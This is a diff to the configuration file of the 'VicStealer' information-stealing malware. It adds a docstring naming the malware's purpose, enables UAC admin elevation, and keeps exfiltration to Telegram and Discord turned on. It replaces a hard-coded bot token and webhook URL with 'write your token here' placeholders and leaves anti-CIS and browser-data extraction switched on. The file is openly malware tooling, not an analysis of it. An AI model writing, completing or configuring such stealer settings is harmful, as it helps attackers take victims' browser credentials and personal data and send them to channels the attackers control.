@@ -1,12 +1,15 @@
+"""this file contains the configuration for the VicStealer malware. It includes settings for logging, anti-analysis measures, data extraction options, and application-specific configurations for stealing sensitive information from various applications."""
+
+
 config: dict[str, str] = {
   "logFileName": f"VicSteal-New-Log",
-  "UACAdmin": False,
-  "antiVM": True,
+  "UACAdmin": True,
+  "antiVM": False,
   "sendToTelegram": True,
   "sendToDiscord": True,
-  "telegramBotToken": "8915595:-KW0DT09u4n5xUTyIV61rZ3sX645M",
-  "telegramChatId": "",
-  "discordWebhookUrl": "https://discord.com/api/webhooks/1549779369419870218/tiJkfuAwcjKDQIWEciA6JDPK-yU6rPrLzpjomgmUvpN",
+  "telegramBotToken": "",# write your telegram bot token here
+  "telegramChatId": "",# write your telegram chat id here
+  "discordWebhookUrl": "",# write your discord webhook url here
   "executionDelay": "",
   "antiCIS": True,
   "extractBrowsersData": True,
